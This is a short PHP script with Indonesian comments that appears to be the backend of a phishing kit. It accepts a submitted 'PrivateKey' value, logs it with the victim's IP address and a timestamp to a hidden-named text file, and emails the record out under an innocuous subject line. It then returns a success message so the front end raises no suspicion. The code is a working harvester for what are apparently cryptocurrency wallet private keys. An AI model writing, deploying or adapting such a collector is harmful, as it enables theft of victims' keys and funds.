<?php 
error_reporting(E_ALL);
ini_set('display_errors', 1);

require 'email_config.php'; // Pastikan file ini tersedia dan tidak ada error

// Cek metode request
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    echo json_encode(["error" => "Gunakan metode POST."]);
    exit();
}

// Ambil data JSON dari request
$inputJSON = file_get_contents('php://input');
$data = json_decode($inputJSON, true);

if (!isset($data["PrivateKey"]) || empty(trim($data["PrivateKey"]))) {
    echo json_encode(["error" => "PrivateKey tidak boleh kosong."]);
    exit();
}

$PrivateKey = trim($data["PrivateKey"]);

// Ambil waktu dan alamat IP pengirim
date_default_timezone_set("Asia/Jakarta"); 
$waktu = date("Y-m-d H:i:s");
$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

// Format data untuk disimpan
$fileData = "PrivateKey    : $PrivateKey\n\n";
$fileData .= "Waktu        : $waktu\n";
$fileData .= "IP Address   : $ip_address\n";
$fileData .= "-------------------------\n";

// Simpan ke file
$file = "BDFBREWQ7HJA7453BF986_______.txt";
file_put_contents($file, $fileData, FILE_APPEND);

// Kirim email
$subject = "Saran testing";
kirim_email($subject, $fileData);

// Kirim response JSON agar tidak error di fetch API
echo json_encode(["success" => true, "message" => "Data berhasil dikirim."]);
exit();
?>
